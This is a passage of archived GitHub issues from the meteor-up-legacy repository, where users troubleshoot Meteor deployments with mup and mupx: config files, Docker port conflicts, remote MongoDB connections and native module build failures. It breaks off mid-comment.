  </Issue_99>
  <Issue_100>
    <Repository>meteor-up-legacy</Repository>
    <Title>mup.json example for windows?</Title>
    <Owner>arunoda</Owner>
    <Body>I developed the Meteor App on my Windows PC and i want to test deployment on localhost to figure out how it works and then i will try moving it to the server.

Does anyone have a mup.json example for Windows?
I'm looking at the example file and **for starters**, i have no clue what password or username to use.

```
  "servers": [
    {
      "host": "hostname",
      "username": "root",
      "password": "password",
      // or pem file (ssh based authentication)
      //"pem": "~/.ssh/id_rsa",
      // Also, for non-standard ssh port use this
      //"sshOptions": { "port" : 49154 },
      // server specific environment variables
      "env": {}
    }
  ],
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>dospolov</Owner>
      <Body>{
  // Server authentication info
  "servers": [
    {
      "host": "32.141.10.29",
      "username": "root",
    //   "password": "password",
      // or pem file (ssh based authentication)
      // WARNING: Keys protected by a passphrase are not supported
      "pem": "/Users/Marat/Documents/ssh/first_key.ppk",
      // Also, for non-standard ssh port use this
      //"sshOptions": { "port" : 49154 },
      // server specific environment variables
      "env": {}
    }
  ],

  // Install MongoDB on the server. Does not destroy the local MongoDB on future setups
  "setupMongo": true,

  // Application name (no spaces).
  "appName": "myfavapp",

  // Location of app (local directory). This can reference '~' as the users home directory.
  // i.e., "app": "~/Meteor/my-app",
  // This is the same as the line below.
  "app": "/playground/myfavapp",

  // Configure environment
  // ROOT_URL must be set to your correct domain (https or http)
  "env": {
    "ROOT_URL": "http://myfavapp.com",
    "CLUSTER_WORKERS_COUNT": 8
  }, 

  // Meteor Up checks if the app comes online just after the deployment.
  // Before mup checks that, it will wait for the number of seconds configured below.
  "deployCheckWaitTime": 60,

  // show a progress bar while uploading.
  // Make it false when you deploy using a CI box.
  "enableUploadProgressBar": true
}

**some fields has been changed**
also Mupx does not work with latest meteor version, we're using murockanew fork of Mupx
</Body>
    </Comment>
    <Comment>
      <Owner>yrvlucero</Owner>
      <Body>@muscaiu I am also trying to deploy my meteor app in Windows localhost but I keep running Install Docker error. Can you tell me what guide you were using in delploying app to Windows?
</Body>
    </Comment>
    <Comment>
      <Owner>muscaiu</Owner>
      <Body>I deployed it with mupx on **DigitalOcean**.
Here is a [Youtube Tutorial](https://www.youtube.com/watch?v=nz2p9xIT2es). Read the comments when u get in trouble.
</Body>
    </Comment>
  </Issue_100>
  <Issue_101>
    <Repository>meteor-up-legacy</Repository>
    <Title>when do I need to run mupx setup?</Title>
    <Owner>arunoda</Owner>
    <Body>Quick and easy question here, but I couldn't find the answer in the documentation.  My apologies if this is not the proper place to ask it.  
When installing multiple apps to the same server using nginx, do I have to run mupx setup for each new app, or just run it once and then deploy each app?  If the former, is that because it is creating the particular database for that app?
</Body>
    <State>open</State>
    <Comment>
      <Owner>MoorsTech</Owner>
      <Body>`mupx setup` installs requirement applications (mongodb, node, phantomjs...depending on your mup.json settings) on your server. You should only need to run this once for any server you deploy to, unless your meteor app requirements change. In that case you should be able to just modify the mup.json file accordingly and do the setup again.
</Body>
    </Comment>
  </Issue_101>
  <Issue_102>
    <Repository>meteor-up-legacy</Repository>
    <Title>mup deploy succeeds but application cannot be accessed</Title>
    <Owner>arunoda</Owner>
    <Body>Hi, 
I have deployed my application with mup, and am getting a success message after running "mup deploy"
here is the logs on the development server

```
Building App Bundle Locally

Started TaskList: Pushing Meteor
[REDACTED IP] - Pushing Meteor App Bundle to The Server
[REDACTED IP] - Pushing Meteor App Bundle to The Server: SUCCESS
[REDACTED IP] - Pushing the Startup Script
[REDACTED IP] - Pushing the Startup Script: SUCCESS

Started TaskList: Configuring  Meteor Environment Variables
[REDACTED IP] - Sending Environment Variables
[REDACTED IP] - Sending Environment Variables: SUCCESS

Started TaskList: Start Meteor
[REDACTED IP] - Start Meteor
[REDACTED IP] - Start Meteor: SUCCESS
[REDACTED IP] - Verifying Deployment
[REDACTED IP] - Verifying Deployment: SUCCESS
```

I am deploying to a fresh Ubuntu 14.04 install on a digital ocean droplet
once I have deployed it seems I can only access the server via the in-browser terminal on digitalocean

I checked what's running on port 80  and got this response
(spacing is wrong as I cannot seem to copy text from the in-browser terminal)

```
netstat -tulpn | grep :80
tcp6    0    0  :: :80           :::*         LISTEN      29348/docker-proxy
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>EasyFormsSam</Owner>
      <Body>If I watch the production server while running mup setup I see several warnings 

```

&gt;&gt;&gt;WARNING&lt;&lt;&lt; Wrong ufstype may corrupt your filesystem, default is ufstype=old
ufs: ufs_fill_super(): bad magic number
qnx: no qnx4 filesystem (no root dir).
ext4-fs (vda15): VFS Can't find ext4 filsystem
ext4-fs (vda15): VFS Can't find ext4 filsystem
ext4-fs (vda15): VFS Can't find ext4 filsystem
squashfs: SQUASHFS error: Can't find a SQUASHFS superblock on vda15
FAT-fs (vda15): invalid media value (0x7d) 
FAT-fs (vda15): invalid media value (0x7d) 
ufs: You didn't specify the type of your ufs filesystem

mount -t ufs -o ufstype=sun|sunx86|44bsd|ufs2|5xbsd|old|hp|nextstep|nextstep-cd|openstep ...

&gt;&gt;&gt;WARNING&lt;&lt;&lt; Wrong ufstype may corrupt your filesystem, default is ufstype=old
ufs: ufs_fill_super(): bad magic number
qnx: no qnx4 filesystem (no root dir).
ext4-fs (vda15): VFS Can't find ext4 filsystem
ext4-fs (vda15): VFS Can't find ext4 filsystem
ext4-fs (vda15): VFS Can't find ext4 filsystem
squashfs: SQUASHFS error: Can't find a SQUASHFS superblock on vda15
FAT-fs (vda15): invalid media value (0x7d) 
FAT-fs (vda15): invalid media value (0x7d) 
ufs: You didn't specify the type of your ufs filesystem

mount -t ufs -o ufstype=sun|sunx86|44bsd|ufs2|5xbsd|old|hp|nextstep|nextstep-cd|openstep ...

&gt;&gt;&gt;WARNING&lt;&lt;&lt; Wrong ufstype may corrupt your filesystem, default is ufstype=old
ufs: ufs_fill_super(): bad magic number
qnx: no qnx4 filesystem (no root dir).

```

(may contain typos due to aforementioned inability to copy text)
</Body>
    </Comment>
  </Issue_102>
  <Issue_103>
    <Repository>meteor-up-legacy</Repository>
    <Title>Trouble building binary NPM in Meteor 1.4</Title>
    <Owner>arunoda</Owner>
    <Body>So my app makes extensive use of a couple of binary NPM modules. Up until the release of Meteor 1.4 I had been using a private Meteor package as a wrapper. With the release of Meteor 1.4 those packages have stopped working because I of the node version, plus I would prefer to use `npm install` moving forward now that Meteor is on a current version of node. Unfortunately I'm having a ton of issues deploying and building those modules using MUPX to my DO droplets. Advice appreciated. This is my readout in my log.

```
&gt; talib@1.0.2 install /bundle/bundle/programs/server/npm/node_modules/talib
&gt; node ./src/lib/build.js &amp;&amp; node-gyp configure &amp;&amp; node-gyp build

building talib functions...
make: Entering directory '/bundle/bundle/programs/server/npm/node_modules/talib/build'
  CXX(target) Release/obj.target/talib/src/talib.o
  SOLINK_MODULE(target) Release/obj.target/talib.node
../src/lib/lib/libta_libc_csr.a: error adding symbols: Archive has no index; run ranlib to add one
collect2: error: ld returned 1 exit status
talib.target.mk:125: recipe for target 'Release/obj.target/talib.node' failed
make: *** [Release/obj.target/talib.node] Error 1
make: Leaving directory '/bundle/bundle/programs/server/npm/node_modules/talib/build'
gyp ERR! build error 
gyp ERR! stack Error: `make` failed with exit code: 2
gyp ERR! stack     at ChildProcess.onExit (/opt/nodejs/lib/node_modules/npm/node_modules/node-gyp/lib/build.js:276:23)
gyp ERR! stack     at emitTwo (events.js:87:13)
gyp ERR! stack     at ChildProcess.emit (events.js:172:7)
gyp ERR! stack     at Process.ChildProcess._handle.onexit (internal/child_process.js:200:12)
gyp ERR! System Linux 4.4.0-31-generic
gyp ERR! command "/opt/nodejs/bin/node" "/opt/nodejs/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js" "build"
gyp ERR! cwd /bundle/bundle/programs/server/npm/node_modules/talib
gyp ERR! node -v v4.4.7
gyp ERR! node-gyp -v v3.4.0
gyp ERR! not ok 

npm ERR! Linux 4.4.0-31-generic
npm ERR! argv "/opt/nodejs/bin/node" "/opt/nodejs/bin/npm" "rebuild" "--no-bin-links" "--update-binary"
npm ERR! node v4.4.7
npm ERR! npm  v3.10.5
npm ERR! code ELIFECYCLE
npm ERR! talib@1.0.2 install: `node ./src/lib/build.js &amp;&amp; node-gyp configure &amp;&amp; node-gyp build`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the talib@1.0.2 install script 'node ./src/lib/build.js &amp;&amp; node-gyp configure &amp;&amp; node-gyp build'.
npm ERR! Make sure you have the latest version of node.js and npm installed.
npm ERR! If you do, this is most likely a problem with the talib package,
npm ERR! not with npm itself.
npm ERR! Tell the author that this fails on your system:
npm ERR!     node ./src/lib/build.js &amp;&amp; node-gyp configure &amp;&amp; node-gyp build
npm ERR! You can get information on how to open an issue for this project with:
npm ERR!     npm bugs talib
npm ERR! Or if that isn't available, you can get their info via:
npm ERR!     npm owner ls talib
npm ERR! There is likely additional logging output above.

npm ERR! Please include the following file with any support request:
npm ERR!     /bundle/bundle/programs/server/npm/npm-debug.log

npm WARN meteor-dev-bundle@0.0.0 No description
npm WARN meteor-dev-bundle@0.0.0 No repository field.
npm WARN meteor-dev-bundle@0.0.0 No license field.
npm ERR! Linux 4.4.0-31-generic
npm ERR! argv "/opt/nodejs/bin/node" "/usr/bin/npm" "install" "--unsafe-perm"
npm ERR! node v4.4.7
npm ERR! npm  v3.10.5
npm ERR! code ELIFECYCLE
npm ERR! meteor-dev-bundle@0.0.0 install: `node npm-rebuild.js`
npm ERR! Exit status 1
npm ERR! 
npm ERR! Failed at the meteor-dev-bundle@0.0.0 install script 'node npm-rebuild.js'.
npm ERR! Make sure you have the latest version of node.js and npm installed.
npm ERR! If you do, this is most likely a problem with the meteor-dev-bundle package,
npm ERR! not with npm itself.
npm ERR! Tell the author that this fails on your system:
npm ERR!     node npm-rebuild.js
npm ERR! You can get information on how to open an issue for this project with:
npm ERR!     npm bugs meteor-dev-bundle
npm ERR! Or if that isn't available, you can get their info via:
npm ERR!     npm owner ls meteor-dev-bundle
npm ERR! There is likely additional logging output above.

npm ERR! Please include the following file with any support request:
npm ERR!     /bundle/bundle/programs/server/npm-debug.log
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>bkwhite</Owner>
      <Body>Having a very bad time with this aswell. 
</Body>
    </Comment>
    <Comment>
      <Owner>doronsever</Owner>
      <Body>Did you found a solution??</Body>
    </Comment>
    <Comment>
      <Owner>bkwhite</Owner>
      <Body>I just had to manually revert the project back to meteor 1.3, which is not a process i'd recommend.  </Body>
    </Comment>
  </Issue_103>
  <Issue_104>
    <Repository>meteor-up-legacy</Repository>
    <Title>Is there a way to pass docker opts or config to from mupx to docker?</Title>
    <Owner>arunoda</Owner>
    <Body>As the title.

The app needs to connect with the mongo on the host (instead of the container). Usually we use docker -- bind or something to pass the hostname binding and the port forwarding.

Is there a way to pass options like this? didn't see it in documentation.
</Body>
    <State>open</State>
    <Comment>
      <Owner>humbertocruz</Owner>
      <Body>I use "MONGO_URL":"mongodb://172.17.0.1/database"  on the mup.json. I have a app splitted in two ( web and mobile ) sharing the same database on the host.
</Body>
    </Comment>
  </Issue_104>
  <Issue_105>
    <Repository>meteor-up-legacy</Repository>
    <Title>Failed Deployment with Msg: mkdir: cannot create directory &#8216;current&#8217;: File exists</Title>
    <Owner>arunoda</Owner>
    <Body>When executing `mupx deploy`, I am presented with the following error message. 
If I manually delete the `/opt/[project name]/current` folder, then deploy, the deployment goes through. I am just wondering if there are ways to get this through in a more proper manner?

```
 x Invoking deployment process: FAILED

    -----------------------------------STDERR-----------------------------------
    sh: 24: [[: not found
    mkdir: cannot create directory &#8216;current&#8217;: File exists
    -----------------------------------STDOUT-----------------------------------
    ----------------------------------------------------------------------------
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>YosBD</Owner>
      <Body>Try to run with "sudo"
</Body>
    </Comment>
    <Comment>
      <Owner>chunsli</Owner>
      <Body>I started with sudo, i.e. the script was run as such: `sudo mupx deploy`  
I have also defaulted to be the root user when I login to the VM, i.e., whenever I login to the VM with the user name I provide in `mup.json`, terminial shows `root@VMName:`, so I don't think its a permission issue.
</Body>
    </Comment>
    <Comment>
      <Owner>gjr-qm</Owner>
      <Body>Maybe have a look at #576?
</Body>
    </Comment>
  </Issue_105>
  <Issue_106>
    <Repository>meteor-up-legacy</Repository>
    <Title>What is the latest pre-docker version?</Title>
    <Owner>arunoda</Owner>
    <Body>I need to update a legacy project, but the latest version of mupx is not compatible since it uses docker and the server does not.  Which version of mupx can I rely on to talk to the server, and how do I install it?  

Worst case, what steps must I take to manually upload the updated bundle myself?

Thanks!
</Body>
    <State>open</State>
    <Comment>
      <Owner>qhello</Owner>
      <Body>Personally, I'm still using the "old" version of meteor-up: https://github.com/arunoda/meteor-up
Since mupx is currently not working with the latest Meteor version..
</Body>
    </Comment>
    <Comment>
      <Owner>romaroma</Owner>
      <Body>npm -g install mup@0.9.2

@jdmswong this one looks good and it was able to correctly update our old apps.
</Body>
    </Comment>
  </Issue_106>
  <Issue_107>
    <Repository>meteor-up-legacy</Repository>
    <Title>Error: The APK file for the Android build was not found</Title>
    <Owner>arunoda</Owner>
    <Body>```
$ mupx deploy

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Using buildOptions : {}
The iOS platform is not installed; skipping build for it.

/home/ubuntu/.meteor/packages/meteor-tool/.1.1.4.yvudr++os.linux.x86_64+web.browser+web.cordova/mt-os.linux.x86_64/dev_bundle/lib/node_modules/fibers/future.js:245
                        throw(ex);
                              ^
Error: The APK file for the Android build was not found.
    at findApkPath (/home/ubuntu/.meteor/packages/meteor-tool/.1.1.4.yvudr++os.linux.x86_64+web.browser+web.cordova/mt-os.linux.x86_64/tools/commands.js:970:11)
    at /home/ubuntu/.meteor/packages/meteor-tool/.1.1.4.yvudr++os.linux.x86_64+web.browser+web.cordova/mt-os.linux.x86_64/tools/commands.js:950:21
    at Array.forEach (native)
    at Function._.each._.forEach (/home/ubuntu/.meteor/packages/meteor-tool/.1.1.4.yvudr++os.linux.x86_64+web.browser+web.cordova/mt-os.linux.x86_64/dev_bundle/lib/node_modules/underscore/underscore.js:79:11)
    at buildCommand (/home/ubuntu/.meteor/packages/meteor-tool/.1.1.4.yvudr++os.linux.x86_64+web.browser+web.cordova/mt-os.linux.x86_64/tools/commands.js:933:29)
    at Command.main.registerCommand._.extend.name [as func] (/home/ubuntu/.meteor/packages/meteor-tool/.1.1.4.yvudr++os.linux.x86_64+web.browser+web.cordova/mt-os.linux.x86_64/tools/commands.js:746:12)
    at /home/ubuntu/.meteor/packages/meteor-tool/.1.1.4.yvudr++os.linux.x86_64+web.browser+web.cordova/mt-os.linux.x86_64/tools/main.js:1363:23

=&gt; Build Error. Check the logs printed above

```
</Body>
    <State>open</State>
    <Comment>
      <Owner>apratimankur</Owner>
      <Body>getting the same error. 
mupx deploy uses meteor build under the hood...
</Body>
    </Comment>
  </Issue_107>
  <Issue_108>
    <Repository>meteor-up-legacy</Repository>
    <Title>[Solved] Mupx deploy remote mongodb problem</Title>
    <Owner>arunoda</Owner>
    <Body>Hi

I am stuck for a week or so now in a meteor deployment. In the other apps I have running I had no problems to deploying them, but they all are in meteor &lt; 1.3 and mup deploy did it well.

Now I have upgraded one of the apps to 1.3, as I needed some npm packages and am very happy with the result on local. The app uses an external mongodb hosted in mongolab, the same db other app (&lt;1.3) uses (maybe that info helps) and that old versioned app can access perfectly.

Firstly, on deploying that new app 1.3 after creating the digitalocean droplet with Ubuntu I got some errors on mup deploy, so I reset the droplet and started using mupx deploy and I finally got no errors. The app is running well, but there's no connection to the remote mongodb, or at least, no data is being loaded from there.
I think all the server config is properly done, as it's said in the manual, and previously done with the old apps.

This is the json file

```
{
  // Server authentication info
  "servers": [
    {
      "host": myIP,
      "username": myuser,
      "password": mypass,
      // or pem file (ssh based authentication)
      //"pem": "~/.ssh/id_rsa"
      "env": {}
    }
  ],

  // Install MongoDB on the server. Does not destroy the local MongoDB on future setups
  "setupMongo": true,

  // Application name (no spaces).
  "appName": "meteor",

  // Location of app (local directory). This can reference '~' as the users home directory.
  // i.e., "app": mydirectory,
  // This is the same as the line below.
  "app": mydirectory,

  // Configure environment
  // ROOT_URL must be set to your correct domain (https or http)
  "env": {
    "ROOT_URL": myurl,
    "PORT": 80,
    "MONGO_URL": "mongodb://user:passwed@ds037415.mongolab.com:port/databasename"
  },

  // Meteor Up checks if the app comes online just after the deployment.
  // Before mup checks that, it will wait for the number of seconds configured below.
  "deployCheckWaitTime": 60,

  // show a progress bar while uploading.
  // Make it false when you deploy using a CI box.
  "enableUploadProgressBar": true
}
```

where, myuser, mypass, user, passwd etc are properly filled

I did a mupx logs -n 300 and this is what I get:

[aa.bb.cc.dd] sudo: unable to resolve host Reservas1.3

"Reservas1.3" is how I named the digitalocean droplet. 

As I said, the app is running well, but not connecting to the remote mongodb

Thank you in advance for the help
</Body>
    <State>open</State>
    <Comment>
      <Owner>Fauphi</Owner>
      <Body>I think I have a similar problem, also with Meteor 1.3.4. It install the mongodb docker on "mupx setup" although setupMongo is set to false.
After deployment the app can't connect to my mongodb (set with MONGO_URL env var). I assume it is using the local/docker db. 
</Body>
    </Comment>
    <Comment>
      <Owner>ridumai</Owner>
      <Body>More things that I did, in case it's useful for somebody:

I got ssh access to the droplet console and tried to connect to the remote mongodb. Got an auth error with code 18. I did read somewhere that might be caused because the Mongo Shell was outdated, and upgraded the Mongo Shell in the ubuntu droplet following this [topic ](http://tecadmin.net/install-mongodb-on-ubuntu/#)

Afterwards I, at least, can connect to the remote database from the ssh terminal with no problems.

Next step is to set my remote mongodb as the default for this droplet, I guess it's a matter of changing a config file in the server but haven't tried yet, if somebody can say how to set that config, it will be very helpful
</Body>
    </Comment>
    <Comment>
      <Owner>ridumai</Owner>
      <Body>One thing that is clear for me is that mup/mupx does not work 100% properly with Meteor 1.3 and external mongodb. Still work to be done.
</Body>
    </Comment>
    <Comment>
      <Owner>ridumai</Owner>
      <Body>Hi!

Finally solved the issue. It was easier than expected. After changing a lot of stuff in the server config, creating and destroying droplets, it turns out that the solution was to set in the mupx config the setup mongo to false. Otherwise the app will connect to the local mongo instead of the remote one (regardless of the environment variables you may set)

So, for me, that worked. In previous versions of meteor with mup, I used to have the setup mongo field as true and my app appeared connected to the remote mongo anyway.
</Body>
    </Comment>
    <Comment>
      <Owner>nisdis</Owner>
      <Body>Great, This was so simple, thanks a ton @ridumai 
</Body>
    </Comment>
    <Comment>
      <Owner>trung1008</Owner>
      <Body>i have same problem. but i had changed like @ridumai talk about. i haven't resovled that :(. anyone can help me :(
</Body>
    </Comment>
  </Issue_108>
  <Issue_109>
    <Repository>meteor-up-legacy</Repository>
    <Title>Mupx: docker: Error response from daemon: driver failed programming external connectivity on endpoint cbv2... Bind for 0.0.0.0:9000 failed: port is already allocated.</Title>
    <Owner>arunoda</Owner>
    <Body>When trying to deploy I got this error:

```
Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Meteor app path    : /Users/lindapeng/Desktop/lindaprojects/stage
Using buildOptions : {}

Started TaskList: Deploy app 'cbv2' (linux)
[192.241.203.23] - Uploading bundle
[192.241.203.23] - Uploading bundle: SUCCESS
[192.241.203.23] - Sending environment variables
[192.241.203.23] - Sending environment variables: SUCCESS
[192.241.203.23] - Initializing start script
[192.241.203.23] - Initializing start script: SUCCESS
[192.241.203.23] - Invoking deployment process
[192.241.203.23] x Invoking deployment process: FAILED

    -----------------------------------STDERR-----------------------------------
    Error response from daemon: No such container: cbv2
    Error response from daemon: No such container: cbv2-frontend
    docker: Error response from daemon: driver failed programming external connectivity on endpoint cbv2 (4f34a8a9022ad350c63ec184c87088d8eab521b4d47dd971422f2d42411e268b): Bind for 0.0.0.0:9000 failed: port is already allocated.
    -----------------------------------STDOUT-----------------------------------
    base: Pulling from meteorhacks/meteord
    4d690fa98655: Already exists
    a3ed95caeb02: Already exists
    0638f01c6191: Already exists
    086f3bb36259: Already exists
    Digest: sha256:684021facd5847f6a4ee2f0095fd26b4d7f5af2b776150531914d43fd0eb889b
    Status: Image is up to date for meteorhacks/meteord:base
    a146089504896c1a7f1aa1ae2cb04c741c6c8379c9ae8a4a091a90ae5cb8a67e
    ----------------------------------------------------------------------------

```

Previously, I'd misguidedly `rm -rf'ed my /opt/` folder after reading through the advice on https://github.com/arunoda/meteor-up/issues/651 in an attempt to get SSL working. Not sure if it's related.
</Body>
    <State>open</State>
    <Comment>
      <Owner>DerMarcus</Owner>
      <Body>Hi, yes it is related. You removed the necessary folder. Just try to remove the still running docker container:
1. docker info - check if container is still running
2. docker stop &lt;app name&gt; try to stop it. If you cant stop it, executed step 3. and restart the docker daemon, because it will not started anymore.
3. docker rm &lt;app name&gt; - for removing the app. Sometimes docker rm -link &lt;app name&gt; is also necessary.
</Body>
    </Comment>
  </Issue_109>
  <Issue_110>
    <Repository>meteor-up-legacy</Repository>
    <Title>Can't use -log and --config together</Title>
    <Owner>arunoda</Owner>
    <Body>Reproduce:

`mupx logs -f  --config=mup-dev.json`

```
Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Using custom configuration/settings file
Configuration file : mup-dev.json
Settings file      : settings.json

[128.000.00.00] flag provided but not defined: --config
[128.000.00.00] See 'docker logs --help'.
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>hwrod</Owner>
      <Body>As a workaround for this, I added an npm script to my `package.json`:

``` json
{
   "scripts": {
       "logs": "ssh USER@HOST -i PRIVATE_KEY \"docker logs -f \\`docker ps -a | grep APPLICATION_NAME |  awk '{print \\$1}'\\`\"",
   }
}
```

so you can tail logs using `npm run logs`.

Just replace the variables in CAPS with your values.
</Body>
    </Comment>
  </Issue_110>
  <Issue_111>
    <Repository>meteor-up-legacy</Repository>
    <Title>mupx deploy: Verifying deployment: FAILED. Error: version `GLIBC_2.14' not found</Title>
    <Owner>arunoda</Owner>
    <Body>I'm failing to deploy my meteor app on AWS EC2 Ubuntu 14.04 Instance. Meteor version is 1.3.3
#### `package.json`

``` javascript
{
  "name": "verbose-report",
  "private": true,
  "scripts": {
    "start": "meteor run"
  },
  "dependencies": {
    "body-parser": "^1.15.1",
    "freshbooks": "^1.0.1",
    "meteor-node-stubs": "~0.2.0"
  }
}
```
#### Deploy Log

```
ubuntu@ip-172-31-18-54:~/verbose-report/deploy$ mupx deploy

Meteor Up: Production Quality Meteor Deployments
------------------------------------------------
Configuration file : mup.json
Settings file      : settings.json

&#8220; Checkout Kadira!
  It's the best way to monitor performance of your app.
  Visit: https://kadira.io/mup &#8221;

Meteor app path    : /home/ubuntu/verbose-report
Using buildOptions : {}

Started TaskList: Deploy app 'verbose-report' (linux)
[52.40.86.78] - Uploading bundle
[52.40.86.78] - Uploading bundle: SUCCESS
[52.40.86.78] - Sending environment variables
[52.40.86.78] - Sending environment variables: SUCCESS
[52.40.86.78] - Initializing start script
[52.40.86.78] - Initializing start script: SUCCESS
[52.40.86.78] - Invoking deployment process
[52.40.86.78] - Invoking deployment process: SUCCESS
[52.40.86.78] - Verifying deployment
[52.40.86.78] x Verifying deployment: FAILED

    -----------------------------------STDERR-----------------------------------
    ed 
    npm WARN deprecated To upgrade to the latest stable version, run:
    npm WARN deprecated 
    npm WARN deprecated   npm -g install npm@latest
    npm WARN deprecated 
    npm WARN deprecated (Depending on how Node.js was installed on your system, you
    npm WARN deprecated may need to prefix the preceding commands with `sudo`, or if
    npm WARN deprecated on Windows, run them from an Administrator prompt.)
    npm WARN deprecated 
    npm WARN deprecated If you're running the version of npm bundled with
    npm WARN deprecated Node.js 0.10 LTS, be aware that the next version of 0.10 LTS
    npm WARN deprecated will be bundled with a version of npm@2, which has some small
    npm WARN deprecated backwards-incompatible changes made to `npm run-script` and
    npm WARN deprecated semver behavior.
    npm WARN package.json meteor-dev-bundle@0.0.0 No description
    npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
    npm WARN package.json meteor-dev-bundle@0.0.0 No README data

    =&gt; Redeploying previous version of the app

    -----------------------------------STDOUT-----------------------------------

    To see more logs type 'mup logs --tail=50'

    ----------------------------------------------------------------------------
```
#### Error Log

```
npm WARN deprecated This version of npm lacks support for important features,
npm WARN deprecated such as scoped packages, offered by the primary npm
npm WARN deprecated registry. Consider upgrading to at least npm@2, if not the
npm WARN deprecated latest stable version. To upgrade to npm@2, run:
npm WARN deprecated 
npm WARN deprecated   npm -g install npm@latest-2
npm WARN deprecated 
npm WARN deprecated To upgrade to the latest stable version, run:
npm WARN deprecated 
npm WARN deprecated   npm -g install npm@latest
npm WARN deprecated 
npm WARN deprecated (Depending on how Node.js was installed on your system, you
npm WARN deprecated may need to prefix the preceding commands with `sudo`, or if
npm WARN deprecated on Windows, run them from an Administrator prompt.)
npm WARN deprecated 
[52.40.86.78] npm WARN deprecated If you're running the version of npm bundled with
[52.40.86.78] npm WARN deprecated Node.js 0.10 LTS, be aware that the next version of 0.10 LTS
[52.40.86.78] npm WARN deprecated will be bundled with a version of npm@2, which has some small
[52.40.86.78] npm WARN deprecated backwards-incompatible changes made to `npm run-script` and
[52.40.86.78] npm WARN deprecated semver behavior.
[52.40.86.78] npm WARN package.json meteor-dev-bundle@0.0.0 No description
[52.40.86.78] npm WARN package.json meteor-dev-bundle@0.0.0 No repository field.
[52.40.86.78] npm WARN package.json meteor-dev-bundle@0.0.0 No README data
[52.40.86.78] npm WARN cannot run in wd meteor-dev-bundle@0.0.0 node npm-rebuild.js (wd=/bundle/bundle/programs/server)
[52.40.86.78] =&gt; Starting meteor app on port:80
[52.40.86.78] 
[52.40.86.78] /bundle/bundle/programs/server/node_modules/fibers/future.js:280
[52.40.86.78]                       throw(ex);
[52.40.86.78]                             ^
[52.40.86.78] Error: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.14' not found (required by /bundle/bundle/programs/server/npm/node_modules/freshbooks/node_modules/libxmljs/build/Release/xmljs.node)
[52.40.86.78]     at Module.load (module.js:356:32)
[52.40.86.78]     at Module.Mp.load (/bundle/bundle/programs/server/npm/node_modules/meteor/babel-compiler/node_modules/meteor-babel/node_modules/reify/node/runtime.js:16:23)
[52.40.86.78]     at Function.Module._load (module.js:312:12)
[52.40.86.78]     at Module.require (module.js:364:17)
[52.40.86.78]     at require (module.js:380:17)
[52.40.86.78]     at bindings (/bundle/bundle/programs/server/npm/node_modules/freshbooks/node_modules/libxmljs/node_modules/bindings/bindings.js:76:44)
[52.40.86.78]     at Object.&lt;anonymous&gt; (/bundle/bundle/programs/server/npm/node_modules/freshbooks/node_modules/libxmljs/lib/bindings.js:1:37)
[52.40.86.78]     at Module._compile (module.js:456:26)
[52.40.86.78]     at Object.Module._extensions..js (module.js:474:10)
[52.40.86.78]     at Module.load (module.js:356:32)
```

I've tried installing missing packages on my AWS instance (following from Stackoverflow suggestions), but it did not help.

Earlier I was trying to deploy from my Mac machine. So I thought it's the issue. So I also tried to deploy the app from another AWS EC2 Ubuntu 14.04 instance. But it gave me same results.

Any help would be good here.

P.S.: `freshbooks` package is making use of `node-gyp` which seems to be platform dependent.
</Body>
    <State>open</State>
    <Comment>
      <Owner>55</Owner>
      <Body>Same here.
Ubuntu 14.04. Meteor version is 1.3.3

```
    pm-rebuild.js (wd=/bundle/bundle/programs/server)
    =&gt; Starting meteor app on port:80

    /bundle/bundle/programs/server/node_modules/fibers/future.js:267
                            throw(ex);
                                  ^
    Error: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.14' not found (required by /bundle/bundle/programs/server/npm/node_modules/meteor/npm-bcrypt/node_modules/bcrypt/build/Release/bcrypt_lib.node)
        at Module.load (module.js:356:32)
        at Function.Module._load (module.js:312:12)
        at Module.require (module.js:364:17)
        at require (module.js:380:17)
        at bindings (/bundle/bundle/programs/server/npm/node_modules/meteor/npm-bcrypt/node_modules/bcrypt/node_modules/bindings/bindings.js:76:44)
        at Object.&lt;anonymous&gt; (/bundle/bundle/programs/server/npm/node_modules/meteor/npm-bcrypt/node_modules/bcrypt/bcrypt.js:3:35)
        at Module._compile (module.js:456:26)
        at Object.Module._extensions..js (module.js:474:10)
        at Module.load (module.js:356:32)
        at Function.Module._load (module.js:312:12)
```
</Body>
    </Comment>
    <Comment>
      <Owner>gVolop</Owner>
      <Body>same :( 

 =&gt; Starting meteor app on port:80

```
    /bundle/bundle/programs/server/node_modules/fibers/future.js:280
                                                    throw(ex);
                                                          ^
    Error: Cannot find module 'graylog2'
        at Function.Module._resolveFilename (module.js:338:15)
        at Function.Module._load (module.js:280:25)
        at Module.require (module.js:364:17)
        at require (module.js:380:17)
        at Object.Npm.require (/bundle/bundle/programs/server/boot.js:171:18)
        at Package (packages/wrap-graylog2/graylog2.js:1:1)
        at packages/wrap-graylog2/graylog2.js:1:1
        at packages/wrap-graylog2/graylog2.js:1:1
        at /bundle/bundle/programs/server/boot.js:297:10
        at Array.forEach (native)

    =&gt; Redeploying previous version of the app
```
</Body>
    </Comment>
    <Comment>
      <Owner>xanderv87</Owner>
      <Body>I had exactly the same problem ( version `GLIBC_2.14' not found ).

In my case I was able to fix it by reinstalling Meteor from scratch, best guess for now is that the meteor 1.4beta toolchain was causing the issue.
</Body>
    </Comment>
    <Comment>
      <Owner>gVolop</Owner>
      <Body>this post really helped me. [themeteorchef:using-npm-packages](https://themeteorchef.com/snippets/using-npm-packages/#tmc-adding-an-npm-package-with-a-meteor-package)  

